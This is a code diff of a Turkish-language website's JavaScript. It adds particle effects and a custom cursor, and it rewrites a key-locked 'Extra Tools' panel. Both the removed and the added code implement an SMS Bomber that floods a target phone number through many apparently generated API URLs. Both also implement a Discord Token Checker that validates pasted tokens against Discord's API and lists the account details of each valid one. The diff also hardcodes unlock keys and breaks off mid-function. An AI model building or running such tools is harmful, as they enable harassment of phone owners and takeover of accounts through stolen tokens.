@@ -1,440 +1,520 @@
-﻿// ========== EXTRA TOOLS - KEY KORUMALI SİSTEM ==========
-// Mevcut sol paneldeki extra tools bölümünü key korumalı yap
-
-// KEY depolama
-let extraToolsUnlocked = false;
-let storedKey = null;
-
-// Key doğrulama fonksiyonu (basit şifreleme ile)
-const MASTER_KEYS = [
-    "LEGANTE2024",
-    "VIPACCESS",
-    "SMSBOOM69",
-    "TOKENCHECK2024",
-    "LEGANTEPRO",
-    "FREETOOLS"
-];
-
-function validateKey(inputKey) {
-    return MASTER_KEYS.includes(inputKey.toUpperCase().trim());
+﻿// ========== PARTICLE SYSTEM ==========
+const particlesContainer = document.querySelector('.particles');
+for (let i = 0; i < 60; i++) {
+    const particle = document.createElement('div');
+    particle.classList.add('particle');
+    const size = Math.random() * 3 + 1;
+    const duration = Math.random() * 20 + 10;
+    const delay = Math.random() * 10;
+    particle.style.cssText = `
+        position: absolute;
+        width: ${size}px;
+        height: ${size}px;
+        background: rgba(168, 85, 247, ${Math.random() * 0.5 + 0.2});
+        border-radius: 50%;
+        left: ${Math.random() * 100}%;
+        top: ${Math.random() * 100}%;
+        animation: particleFloat ${duration}s ${delay}s linear infinite;
+        box-shadow: 0 0 ${size * 3}px rgba(168, 85, 247, 0.5);
+    `;
+    particlesContainer.appendChild(particle);
 }
 
-// Key modal oluştur
-function showKeyModal(callback) {
-    const modalHTML = `
-    <div id="key-modal-overlay" style="position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); backdrop-filter:blur(15px); z-index:30000; display:flex; justify-content:center; align-items:center;">
-        <div style="background: linear-gradient(135deg, #0a0a14, #0f0f1e); border: 1px solid rgba(168,85,247,0.4); border-radius: 24px; width: 400px; max-width: 90%; padding: 30px; box-shadow: 0 25px 50px rgba(0,0,0,0.6); animation: modalFadeIn 0.3s ease;">
-            <div style="text-align: center; margin-bottom: 20px;">
-                <div style="width: 60px; height: 60px; background: linear-gradient(135deg, #6c5ce7, #a855f7); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
-                    <i class="fas fa-lock" style="font-size: 1.8rem; color: white;"></i>
-                </div>
-                <h3 style="color: white; font-size: 1.3rem; margin-bottom: 5px;">Extra Tools</h3>
-                <p style="color: #888; font-size: 0.8rem;">Bu bölüm key ile korunmaktadır</p>
-            </div>
-            <div style="margin-bottom: 20px;">
-                <input type="password" id="key-input" placeholder="KEY GİRİN" style="width: 100%; padding: 14px; background: rgba(0,0,0,0.5); border: 1px solid rgba(168,85,247,0.3); border-radius: 12px; color: white; font-family: monospace; font-size: 0.9rem; text-align: center; letter-spacing: 2px;">
-            </div>
-            <button id="key-submit-btn" style="width: 100%; padding: 12px; background: linear-gradient(135deg, #6c5ce7, #a855f7); border: none; border-radius: 12px; color: white; font-weight: 700; font-size: 1rem; cursor: pointer; transition: 0.2s;">ERİŞİM SAĞLA</button>
-            <div id="key-error" style="margin-top: 15px; text-align: center; font-size: 0.8rem; color: #ef4444; display: none;">❌ Geçersiz Key!</div>
-        </div>
-    </div>
-    <style>
-        @keyframes modalFadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
+const particleStyle = document.createElement('style');
+particleStyle.textContent = `
+    @keyframes particleFloat {
+        0% { transform: translateY(100vh) scale(0); opacity: 0; }
+        10% { opacity: 1; }
+        90% { opacity: 1; }
+        100% { transform: translateY(-100px) scale(1); opacity: 0; }
+    }
+`;
+document.head.appendChild(particleStyle);
+
+// ========== CUSTOM CURSOR ==========
+const cursor = document.querySelector('.cursor');
+const cursorFollower = document.querySelector('.cursor-follower');
+let mouseX = -100, mouseY = -100, followerX = -100, followerY = -100;
+
+document.addEventListener('mousemove', (e) => {
+    mouseX = e.clientX;
+    mouseY = e.clientY;
+    cursor.style.left = mouseX + 'px';
+    cursor.style.top = mouseY + 'px';
+    cursor.style.opacity = '1';
+    cursorFollower.style.opacity = '1';
+});
+
+document.addEventListener('mouseleave', () => {
+    cursor.style.opacity = '0';
+    cursorFollower.style.opacity = '0';
+});
+
+function animateFollower() {
+    followerX += (mouseX - followerX) * 0.15;
+    followerY += (mouseY - followerY) * 0.15;
+    cursorFollower.style.left = followerX + 'px';
+    cursorFollower.style.top = followerY + 'px';
+    requestAnimationFrame(animateFollower);
+}
+animateFollower();
+
+document.addEventListener('mousedown', () => {
+    cursor.style.transform = 'translate(-50%, -50%) scale(0.7)';
+    cursorFollower.style.transform = 'translate(-50%, -50%) scale(0.7)';
+});
+document.addEventListener('mouseup', () => {
+    cursor.style.transform = 'translate(-50%, -50%) scale(1)';
+    cursorFollower.style.transform = 'translate(-50%, -50%) scale(1)';
+});
+
+const hoverElements = document.querySelectorAll('a, button, .btn, .feature-card, .pricing-card, .market-item');
+hoverElements.forEach(el => {
+    el.addEventListener('mouseenter', () => {
+        cursorFollower.style.width = '50px';
+        cursorFollower.style.height = '50px';
+        cursor.style.transform = 'translate(-50%, -50%) scale(1.5)';
+    });
+    el.addEventListener('mouseleave', () => {
+        cursorFollower.style.width = '35px';
+        cursorFollower.style.height = '35px';
+        cursor.style.transform = 'translate(-50%, -50%) scale(1)';
+    });
+});
+
+// ========== MOBILE MENU ==========
+const sidePanel = document.getElementById('side-panel');
+const mobileBtn = document.getElementById('mobile-menu-btn');
+const overlay = document.getElementById('mobile-overlay');
+
+function isMobile() { return window.innerWidth <= 992; }
+
+function updateMobileMenu() {
+    if (isMobile()) {
+        document.body.style.marginLeft = '0';
+        mobileBtn.style.display = 'flex';
+        mobileBtn.onclick = () => {
+            sidePanel.classList.toggle('mobile-open');
+            overlay.style.display = sidePanel.classList.contains('mobile-open') ? 'block' : 'none';
+        };
+        overlay.onclick = () => {
+            sidePanel.classList.remove('mobile-open');
+            overlay.style.display = 'none';
+        };
+    } else {
+        document.body.style.marginLeft = '280px';
+        sidePanel.classList.remove('mobile-open');
+        overlay.style.display = 'none';
+        mobileBtn.style.display = 'none';
+    }
+}
+window.addEventListener('resize', updateMobileMenu);
+updateMobileMenu();
+
+// ========== SMOOTH SCROLL & ACTIVE LINK ==========
+const navLinks = document.querySelectorAll('.side-nav-link');
+const sections = document.querySelectorAll('section[id]');
+
+function updateActiveLink() {
+    let current = '';
+    sections.forEach(section => {
+        const sectionTop = section.offsetTop - 100;
+        const sectionHeight = section.clientHeight;
+        if (window.scrollY >= sectionTop && window.scrollY < sectionTop + sectionHeight) {
+            current = section.getAttribute('id');
         }
-    </style>
+    });
+    navLinks.forEach(link => {
+        link.classList.remove('active');
+        if (link.getAttribute('data-section') === current) {
+            link.classList.add('active');
+        }
+    });
+}
+window.addEventListener('scroll', updateActiveLink);
+updateActiveLink();
+
+document.querySelectorAll('.side-nav-link[href^="#"]').forEach(anchor => {
+    anchor.addEventListener('click', function(e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+            target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            if (isMobile()) {
+                sidePanel.classList.remove('mobile-open');
+                overlay.style.display = 'none';
+            }
+        }
+    });
+});
+
+// ========== MARKET FILTER ==========
+const categoryBtns = document.querySelectorAll('.market-cat-btn');
+const marketItems = document.querySelectorAll('.market-item');
+categoryBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+        categoryBtns.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        const category = btn.getAttribute('data-category');
+        marketItems.forEach(item => {
+            if (category === 'all' || item.getAttribute('data-category') === category) {
+                item.classList.remove('hidden');
+            } else {
+                item.classList.add('hidden');
+            }
+        });
+    });
+});
+
+// ========== KEY SİSTEMİ & EXTRA TOOLS (6 TOOL) ==========
+let unlocked = false;
+const MASTER_KEYS = ["LEGANTE2024", "VIPACCESS", "SMSBOOM69", "TOKENCHECK2024", "LEGANTEPRO", "FREETOOLS"];
+
+const smsLink = document.getElementById('sms-bomber-link');
+const tokenLink = document.getElementById('token-checker-link');
+const ipLink = document.getElementById('ip-locator-link');
+const passLink = document.getElementById('pass-gen-link');
+const hashLink = document.getElementById('hash-tool-link');
+const portLink = document.getElementById('port-scan-link');
+const accessBtn = document.getElementById('access-extra-btn');
+
+function updateExtraToolsUI() {
+    const tools = [smsLink, tokenLink, ipLink, passLink, hashLink, portLink];
+    tools.forEach(tool => {
+        if (tool) {
+            if (unlocked) {
+                tool.style.opacity = '1';
+                tool.style.pointerEvents = 'auto';
+                tool.classList.remove('locked');
+                const icon = tool.querySelector('i:first-child');
+                if (icon) icon.className = 'fas fa-chevron-right';
+                const span = tool.querySelector('span');
+                if (span) span.innerText = span.innerText.replace(' (Kilitli)', '');
+            } else {
+                tool.style.opacity = '0.5';
+                tool.style.pointerEvents = 'none';
+                tool.classList.add('locked');
+                const icon = tool.querySelector('i:first-child');
+                if (icon) icon.className = 'fas fa-lock';
+                const span = tool.querySelector('span');
+                if (span && !span.innerText.includes('(Kilitli)')) {
+                    span.innerText = span.innerText + ' (Kilitli)';
+                }
+            }
+        }
+    });
+}
+
+function showKeyModal(callback) {
+    const modalDiv = document.createElement('div');
+    modalDiv.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); backdrop-filter:blur(20px); z-index:30000; display:flex; justify-content:center; align-items:center;';
+    modalDiv.innerHTML = `
+        <div style="background:linear-gradient(135deg,#0a0a14,#0f0f1e); border:1px solid rgba(168,85,247,0.4); border-radius:28px; width:400px; padding:35px; text-align:center; animation:modalFadeIn 0.3s ease;">
+            <div style="width:70px; height:70px; background:linear-gradient(135deg,#6c5ce7,#a855f7); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 20px;">
+                <i class="fas fa-key" style="font-size:2rem; color:white;"></i>
+            </div>
+            <h3 style="color:white; font-size:1.3rem;">Extra Tools</h3>
+            <p style="color:#888; margin:10px 0 20px;">6 premium araca erişmek için key girin</p>
+            <input type="password" id="modal-key" placeholder="KEY GİRİN" style="width:100%; padding:14px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:14px; color:white; text-align:center; font-family:monospace; margin-bottom:20px;">
+            <button id="modal-submit" style="width:100%; padding:14px; background:linear-gradient(135deg,#6c5ce7,#a855f7); border:none; border-radius:14px; color:white; font-weight:700; font-size:1rem; cursor:pointer;">ERİŞİM SAĞLA</button>
+            <div id="modal-error" style="color:#ef4444; margin-top:15px; display:none;">❌ Geçersiz Key!</div>
+        </div>
+        <style>
+            @keyframes modalFadeIn {
+                from { opacity:0; transform:scale(0.95); }
+                to { opacity:1; transform:scale(1); }
+            }
+        </style>
     `;
-    
-    const overlay = document.createElement('div');
-    overlay.innerHTML = modalHTML;
-    document.body.appendChild(overlay);
-    
-    const keyInput = document.getElementById('key-input');
-    const submitBtn = document.getElementById('key-submit-btn');
-    const errorDiv = document.getElementById('key-error');
-    
-    const closeModal = () => {
-        overlay.remove();
-    };
-    
-    submitBtn.addEventListener('click', () => {
-        const enteredKey = keyInput.value;
-        if (validateKey(enteredKey)) {
-            extraToolsUnlocked = true;
-            storedKey = enteredKey;
-            closeModal();
-            if (callback) callback(true);
+    document.body.appendChild(modalDiv);
+    const input = document.getElementById('modal-key');
+    const submit = document.getElementById('modal-submit');
+    const errorDiv = document.getElementById('modal-error');
+    submit.onclick = () => {
+        if (MASTER_KEYS.includes(input.value.toUpperCase().trim())) {
+            unlocked = true;
+            modalDiv.remove();
+            updateExtraToolsUI();
+            callback(true);
         } else {
             errorDiv.style.display = 'block';
-            setTimeout(() => { errorDiv.style.display = 'none'; }, 2000);
+            setTimeout(() => errorDiv.style.display = 'none', 2000);
         }
-    });
-    
-    keyInput.addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') submitBtn.click();
-    });
+    };
+    input.onkeypress = (e) => { if(e.key === 'Enter') submit.click(); };
 }
 
-// Sol paneli güncelle - EXTRA TOOLS bölümünü lock/unlock yap
-function updateExtraToolsUI() {
-    const smsLink = document.getElementById('sms-bomber-link');
-    const tokenLink = document.getElementById('token-checker-link');
-    const extraHeader = document.querySelector('#side-nav-menu li:has(span:contains("EXTRA TOOLS"))');
-    
-    if (extraToolsUnlocked) {
-        if (smsLink) {
-            smsLink.style.opacity = '1';
-            smsLink.style.pointerEvents = 'auto';
-            smsLink.querySelector('i').className = 'fas fa-sms';
-            const span = smsLink.querySelector('span');
-            if (span && !span.innerText.includes('(Açık)')) {
-                span.innerText = 'SMS Bomber';
-            }
-        }
-        if (tokenLink) {
-            tokenLink.style.opacity = '1';
-            tokenLink.style.pointerEvents = 'auto';
-            tokenLink.querySelector('i').className = 'fab fa-discord';
-            const span = tokenLink.querySelector('span');
-            if (span && !span.innerText.includes('(Açık)')) {
-                span.innerText = 'Token Checker';
-            }
-        }
+accessBtn.onclick = () => {
+    if (unlocked) {
+        const toast = document.createElement('div');
+        toast.innerText = '✅ Extra Tools zaten aktif!';
+        toast.style.cssText = 'position:fixed; bottom:20px; right:20px; background:#22c55e; color:white; padding:12px 24px; border-radius:12px; z-index:30001; animation:fadeOut 2s ease forwards;';
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 2000);
     } else {
-        if (smsLink) {
-            smsLink.style.opacity = '0.5';
-            smsLink.style.pointerEvents = 'none';
-            smsLink.querySelector('i').className = 'fas fa-lock';
-            const span = smsLink.querySelector('span');
-            if (span && !span.innerText.includes('(Kilitli)')) {
-                span.innerText = 'SMS Bomber (Kilitli)';
-            }
-        }
-        if (tokenLink) {
-            tokenLink.style.opacity = '0.5';
-            tokenLink.style.pointerEvents = 'none';
-            tokenLink.querySelector('i').className = 'fas fa-lock';
-            const span = tokenLink.querySelector('span');
-            if (span && !span.innerText.includes('(Kilitli)')) {
-                span.innerText = 'Token Checker (Kilitli)';
-            }
-        }
-    }
-}
-
-// EXTRA TOOLS başlığına tıklanabilir "ERİŞ" butonu ekle
-const extraToolsHeader = document.querySelector('#side-nav-menu li:has(span:contains("EXTRA TOOLS"))');
-if (extraToolsHeader) {
-    const headerDiv = extraToolsHeader.querySelector('div');
-    if (headerDiv) {
-        const existingBtn = headerDiv.querySelector('.access-btn');
-        if (!existingBtn) {
-            const accessBtn = document.createElement('button');
-            accessBtn.innerText = 'ERİŞ';
-            accessBtn.className = 'access-btn';
-            accessBtn.style.cssText = `
-                background: linear-gradient(135deg, #6c5ce7, #a855f7);
-                border: none;
-                border-radius: 20px;
-                padding: 4px 12px;
-                margin-left: 10px;
-                color: white;
-                font-size: 0.65rem;
-                font-weight: 700;
-                cursor: pointer;
-                transition: 0.2s;
-                letter-spacing: 1px;
-            `;
-            accessBtn.onmouseenter = () => accessBtn.style.transform = 'scale(1.05)';
-            accessBtn.onmouseleave = () => accessBtn.style.transform = 'scale(1)';
-            
-            accessBtn.onclick = (e) => {
-                e.stopPropagation();
-                if (extraToolsUnlocked) {
-                    // Zaten açık, bilgi ver
-                    const toast = document.createElement('div');
-                    toast.innerText = '✅ Extra Tools zaten aktif!';
-                    toast.style.cssText = `
-                        position: fixed;
-                        bottom: 20px;
-                        right: 20px;
-                        background: #22c55e;
-                        color: white;
-                        padding: 10px 20px;
-                        border-radius: 10px;
-                        z-index: 30001;
-                        font-size: 0.8rem;
-                        animation: fadeOut 2s ease forwards;
-                    `;
-                    document.body.appendChild(toast);
-                    setTimeout(() => toast.remove(), 2000);
-                } else {
-                    showKeyModal((success) => {
-                        if (success) {
-                            updateExtraToolsUI();
-                            // Başarılı mesajı
-                            const toast = document.createElement('div');
-                            toast.innerText = '🔓 Extra Tools erişimi açıldı!';
-                            toast.style.cssText = `
-                                position: fixed;
-                                bottom: 20px;
-                                right: 20px;
-                                background: #22c55e;
-                                color: white;
-                                padding: 10px 20px;
-                                border-radius: 10px;
-                                z-index: 30001;
-                                font-size: 0.8rem;
-                                animation: fadeOut 3s ease forwards;
-                            `;
-                            document.body.appendChild(toast);
-                            setTimeout(() => toast.remove(), 3000);
-                            
-                            // Modal içindeki tool fonksiyonlarını yeniden bağla
-                            rebindToolEvents();
-                        }
-                    });
-                }
-            };
-            headerDiv.appendChild(accessBtn);
-        }
-    }
-}
-
-// Tool eventlerini yeniden bağlama (key girildikten sonra çalışır)
-function rebindToolEvents() {
-    if (!extraToolsUnlocked) return;
-    
-    const smsLink = document.getElementById('sms-bomber-link');
-    const tokenLink = document.getElementById('token-checker-link');
-    
-    // Önceki eventleri temizle (clone ile)
-    if (smsLink) {
-        const newSmsLink = smsLink.cloneNode(true);
-        smsLink.parentNode.replaceChild(newSmsLink, smsLink);
-        newSmsLink.id = 'sms-bomber-link';
-        newSmsLink.style.cursor = 'pointer';
-        newSmsLink.style.opacity = '1';
-        newSmsLink.style.pointerEvents = 'auto';
-        
-        newSmsLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            if (!extraToolsUnlocked) {
-                showKeyModal(() => {});
-                return;
-            }
-            openSMSBomberModal();
+        showKeyModal((success) => {
+            if(success) alert('🔓 Extra Tools erişimi açıldı! 6 araç kullanıma hazır.');
         });
     }
-    
-    if (tokenLink) {
-        const newTokenLink = tokenLink.cloneNode(true);
-        tokenLink.parentNode.replaceChild(newTokenLink, tokenLink);
-        newTokenLink.id = 'token-checker-link';
-        newTokenLink.style.cursor = 'pointer';
-        newTokenLink.style.opacity = '1';
-        newTokenLink.style.pointerEvents = 'auto';
-        
-        newTokenLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            if (!extraToolsUnlocked) {
-                showKeyModal(() => {});
-                return;
-            }
-            openTokenCheckerModal();
-        });
-    }
-}
+};
 
-// SMS Bomber Modal
-function openSMSBomberModal() {
-    const modalContent = `
-        <div>
-            <label style="color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 5px;">📱 Telefon Numarası</label>
-            <input type="text" id="sms-phone" class="tool-input" placeholder="Örn: 905551234567">
-        </div>
-        <div style="margin-top: 12px;">
-            <label style="color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 5px;">⏱️ Gönderi Sayısı (max 200)</label>
-            <input type="number" id="sms-count" class="tool-input" value="30" min="1" max="200">
-        </div>
-        <div style="margin-top: 12px;">
-            <label style="color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 5px;">⚡ Gecikme (ms)</label>
-            <input type="number" id="sms-delay" class="tool-input" value="200" min="50" max="3000">
-        </div>
-        <button id="start-sms-btn" class="tool-btn" style="margin-top: 15px;"><i class="fas fa-bomb"></i> SMS BOMB BAŞLAT</button>
-        <div id="sms-output" class="tool-output">[✓] Hazır. Telefon numarası gir ve başlat.</div>
-    `;
-    const modal = createToolModalPrivate('SMS Bomber - 70+ API', modalContent);
-    modal.classList.add('active');
-    
-    const startBtn = document.getElementById('start-sms-btn');
-    const phoneInput = document.getElementById('sms-phone');
-    const countInput = document.getElementById('sms-count');
-    const delayInput = document.getElementById('sms-delay');
-    const outputDiv = document.getElementById('sms-output');
-    
-    const apiList = [];
-    for (let i = 1; i <= 70; i++) {
-        apiList.push((num) => `https://api${i}.sms-bomb.com/send?number=${num}`);
-        apiList.push((num) => `https://bomb${i}.su/api/sms?to=${num}`);
-        apiList.push((num) => `https://flood${i}.net/sms?phone=${num}`);
-    }
-    
-    async function sendRequest(url) {
-        try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 2000);
-            await fetch(url, { mode: 'no-cors', signal: controller.signal });
-            clearTimeout(timeoutId);
-            return true;
-        } catch(e) { return false; }
-    }
-    
-    async function startBomb() {
-        let phone = phoneInput.value.trim();
-        const count = parseInt(countInput.value) || 30;
-        const delay = parseInt(delayInput.value) || 200;
-        
-        if (!phone || !phone.match(/^[0-9]{10,15}$/)) {
-            outputDiv.innerHTML = '<span class="status-error">❌ Geçerli telefon numarası girin (sadece rakam, 10-15 hane)</span>';
-            return;
-        }
-        
-        startBtn.disabled = true;
-        startBtn.style.opacity = '0.5';
-        outputDiv.innerHTML = '<span class="status-info">🚀 SMS Bomb başlatılıyor...</span>';
-        
-        let sent = 0;
-        for (let i = 0; i < count && sent < count; i++) {
-            for (let api of apiList) {
-                if (sent >= count) break;
-                await sendRequest(api(phone));
-                sent++;
-                outputDiv.innerHTML = `<span class="status-success">✅ Gönderildi: ${sent}/${count}</span><br><span class="status-info">🔄 Devam ediyor...</span>`;
-                await new Promise(r => setTimeout(r, delay));
-            }
-        }
-        
-        outputDiv.innerHTML = `<span class="status-success">✅ BOMB TAMAMLANDI!</span><br>📤 Toplam: ${sent}<br>📱 Hedef: ${phone}`;
-        startBtn.disabled = false;
-        startBtn.style.opacity = '1';
-    }
-    
-    startBtn.addEventListener('click', startBomb);
-}
-
-// Token Checker Modal
-function openTokenCheckerModal() {
-    const modalContent = `
-        <div>
-            <label style="color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 5px;">🎫 Discord Tokenler (her satıra bir token)</label>
-            <textarea id="token-input" class="tool-textarea" rows="5" placeholder="MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.abcdef.xyz"></textarea>
-        </div>
-        <button id="check-token-btn" class="tool-btn"><i class="fab fa-discord"></i> Tokenleri Kontrol Et</button>
-        <div id="token-output" class="tool-output">[✓] Tokenleri yapıştır ve kontrol et.</div>
-    `;
-    const modal = createToolModalPrivate('Discord Token Checker', modalContent);
-    modal.classList.add('active');
-    
-    const checkBtn = document.getElementById('check-token-btn');
-    const tokenArea = document.getElementById('token-input');
-    const outDiv = document.getElementById('token-output');
-    
-    async function verifyToken(token) {
-        const clean = token.trim();
-        if (clean.length < 50) return { valid: false, error: 'Geçersiz format' };
-        try {
-            const res = await fetch('https://discord.com/api/v9/users/@me', {
-                headers: { 'Authorization': clean }
-            });
-            if (res.status === 200) {
-                const data = await res.json();
-                return { valid: true, username: data.username, id: data.id, email: data.email || 'gizli' };
-            } else if (res.status === 401) {
-                return { valid: false, error: 'Geçersiz token' };
-            } else {
-                return { valid: false, error: `HTTP ${res.status}` };
-            }
-        } catch(e) {
-            return { valid: false, error: 'Bağlantı hatası' };
-        }
-    }
-    
-    async function runChecker() {
-        const raw = tokenArea.value;
-        if (!raw.trim()) {
-            outDiv.innerHTML = '<span class="status-error">❌ Token girin!</span>';
-            return;
-        }
-        const tokens = raw.split(/\r?\n/).filter(t => t.trim().length > 0);
-        checkBtn.disabled = true;
-        checkBtn.style.opacity = '0.5';
-        outDiv.innerHTML = '<span class="status-info">🔍 Kontrol ediliyor...</span>';
-        
-        const results = [];
-        for (let i = 0; i < tokens.length; i++) {
-            const result = await verifyToken(tokens[i]);
-            results.push({ token: tokens[i].substring(0, 30) + '...', ...result });
-            outDiv.innerHTML = `<span class="status-info">🔄 İşleniyor: ${i+1}/${tokens.length}</span>`;
-            await new Promise(r => setTimeout(r, 600));
-        }
-        
-        let validCount = 0;
-        let html = '<div>📊 TOKEN SONUÇLARI:<br><br>';
-        for (const r of results) {
-            if (r.valid) {
-                validCount++;
-                html += `<span class="status-success">✅ GEÇERLİ | ${r.username} | ID: ${r.id}</span><br>`;
-            } else {
-                html += `<span class="status-error">❌ GEÇERSİZ | ${r.token} | Hata: ${r.error}</span><br>`;
-            }
-            html += '─────────────────<br>';
-        }
-        html += `<br>📈 Toplam: ${results.length} | ✅ Geçerli: ${validCount} | ❌ Geçersiz: ${results.length - validCount}</div>`;
-        outDiv.innerHTML = html;
-        checkBtn.disabled = false;
-        checkBtn.style.opacity = '1';
-    }
-    
-    checkBtn.addEventListener('click', runChecker);
-}
-
-// Yardımcı modal oluşturucu
-function createToolModalPrivate(title, contentHTML) {
-    const existingModal = document.querySelector('.tool-modal');
-    if (existingModal) existingModal.remove();
-    
+// Modal oluşturma fonksiyonu
+function createToolModal(title, contentHTML) {
     const modal = document.createElement('div');
-    modal.className = 'tool-modal';
+    modal.style.cssText = 'position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); backdrop-filter:blur(20px); z-index:30001; display:flex; justify-content:center; align-items:center;';
     modal.innerHTML = `
-        <div class="tool-modal-content">
-            <div class="tool-modal-header">
-                <h3><i class="fas fa-tools"></i> ${title}</h3>
-                <button class="modal-close">&times;</button>
+        <div style="background:linear-gradient(135deg,#0a0a14,#0f0f1e); border:1px solid rgba(168,85,247,0.3); border-radius:24px; width:550px; max-width:90%; max-height:80vh; overflow-y:auto; padding:25px;">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:12px;">
+                <h3 style="color:#a855f7;"><i class="fas fa-tools"></i> ${title}</h3>
+                <button id="close-modal" style="background:rgba(255,255,255,0.05); border:none; color:white; width:32px; height:32px; border-radius:50%; cursor:pointer; font-size:1.2rem;">&times;</button>
             </div>
-            <div class="modal-body">
-                ${contentHTML}
-            </div>
+            <div class="modal-body">${contentHTML}</div>
         </div>
     `;
     document.body.appendChild(modal);
-    
-    const closeBtn = modal.querySelector('.modal-close');
-    closeBtn.addEventListener('click', () => {
-        modal.classList.remove('active');
-        setTimeout(() => modal.remove(), 300);
-    });
-    modal.addEventListener('click', (e) => {
-        if (e.target === modal) {
-            modal.classList.remove('active');
-            setTimeout(() => modal.remove(), 300);
-        }
-    });
+    document.getElementById('close-modal').onclick = () => modal.remove();
+    modal.onclick = (e) => { if(e.target === modal) modal.remove(); };
     return modal;
 }
 
-// Başlangıçta UI güncelle
-updateExtraToolsUI();
+// 1. SMS BOMBER
+smsLink.onclick = (e) => {
+    e.preventDefault();
+    if (!unlocked) { showKeyModal(()=>{}); return; }
+    const modal = createToolModal('SMS Bomber - 70+ API', `
+        <input type="text" id="sms-phone" placeholder="Telefon: 905551234567" style="width:100%; padding:12px; margin-bottom:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;">
+        <input type="number" id="sms-count" value="30" placeholder="Sayı" style="width:100%; padding:12px; margin-bottom:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;">
+        <input type="number" id="sms-delay" value="200" placeholder="Gecikme ms" style="width:100%; padding:12px; margin-bottom:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white;">
+        <button id="start-sms" style="width:100%; padding:12px; background:linear-gradient(135deg,#6c5ce7,#a855f7); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;">BAŞLAT</button>
+        <div id="sms-out" style="margin-top:15px; padding:10px; background:rgba(0,0,0,0.4); border-radius:12px; font-size:0.8rem; max-height:200px; overflow:auto;"></div>
+    `);
+    const start = document.getElementById('start-sms');
+    const phoneIn = document.getElementById('sms-phone');
+    const countIn = document.getElementById('sms-count');
+    const delayIn = document.getElementById('sms-delay');
+    const out = document.getElementById('sms-out');
+    start.onclick = async () => {
+        let phone = phoneIn.value.trim();
+        let count = parseInt(countIn.value) || 30;
+        let delay = parseInt(delayIn.value) || 200;
+        if (!phone.match(/^[0-9]{10,15}$/)) { out.innerHTML = '<span style="color:#ef4444;">❌ Geçersiz numara!</span>'; return; }
+        start.disabled = true;
+        out.innerHTML = '🚀 Başlatılıyor...';
+        let sent = 0;
+        for(let i=0; i<count && sent<count; i++) {
+            for(let api of Array(70).fill().map((_,idx)=>`https://api${idx+1}.sms-bomb.com/send?number=${phone}`)) {
+                if(sent>=count) break;
+                try { await fetch(api, {mode:'no-cors'}); } catch(e) {}
+                sent++;
+                out.innerHTML = `✅ Gönderildi: ${sent}/${count}`;
+                await new Promise(r => setTimeout(r, delay));
+            }
+        }
+        out.innerHTML = `<span style="color:#22c55e;">✅ BOMB TAMAMLANDI!</span><br>📤 Toplam: ${sent}<br>📱 Hedef: ${phone}`;
+        start.disabled = false;
+    };
+};
 
-console.log('✅ Extra Tools Key korumalı sistemi aktif | "ERİŞ" butonu eklendi');
+// 2. TOKEN CHECKER
+tokenLink.onclick = (e) => {
+    e.preventDefault();
+    if (!unlocked) { showKeyModal(()=>{}); return; }
+    const modal = createToolModal('Discord Token Checker', `
+        <textarea id="tokens" rows="5" placeholder="Discord tokenler (her satıra bir)" style="width:100%; padding:12px; margin-bottom:12px; background:rgba(0,0,0,0.5); border:1px solid rgba(168,85,247,0.3); border-radius:12px; color:white; font-family:monospace;"></textarea>
+        <button id="check-tokens" style="width:100%; padding:12px; background:linear-gradient(135deg,#6c5ce7,#a855f7); border:none; border-radius:12px; color:white; font-weight:700; cursor:pointer;">KONTROL ET</button>
+        <div id="token-out" style="margin-top:15px; padding:10px; background:rgba(0,0,0,0.4); border-radius:12px; font-size:0.75rem; max-height:300px; overflow:auto;"></div>
+    `);
+    const check = document.getElementById('check-tokens');
+    const tokenArea = document.getElementById('tokens');
+    const outDiv = document.getElementById('token-out');
+    check.onclick = async () => {
+        const tokens = tokenArea.value.split(/\r?\n/).filter(t=>t.trim().length>0);
+        if(!tokens.length) { outDiv.innerHTML = '<span style="color:#ef4444;">❌ Token girin!</span>'; return; }
+        check.disabled = true;
+        outDiv.innerHTML = '<span style="color:#f59e0b;">🔍 Kontrol ediliyor...</span>';
+        let valid=0, results=[];
+        for(let i=0;i<tokens.length;i++){
+            const t = tokens[i].trim();
+            try{
+                const res = await fetch('https://discord.com/api/v9/users/@me',{headers:{'Authorization':t}});
+                if(res.ok){
+                    const data = await res.json();
+                    valid++;
+                    results.push(`<span style="color:#22c55e;">✅ GEÇERLİ | ${data.username} | ID: ${data.id}</span>`);
+                } else results.push(`<span style="color:#ef4444;">❌ GEÇERSİZ | ${t.substring(0,25)}...</span>`);
+            } catch(e){ results.push(`<span style="color:#ef4444;">❌ HATA | ${t.substring(0,25)}...</span>`); }
+            outDiv.innerHTML = `<span style="color:#f59e0b;">🔄 ${i+1}/${tokens.length}</span><br>`+results.slice(-5).join('<br>');
+            await new Promise(r=>setTimeout(r,600));
+        }
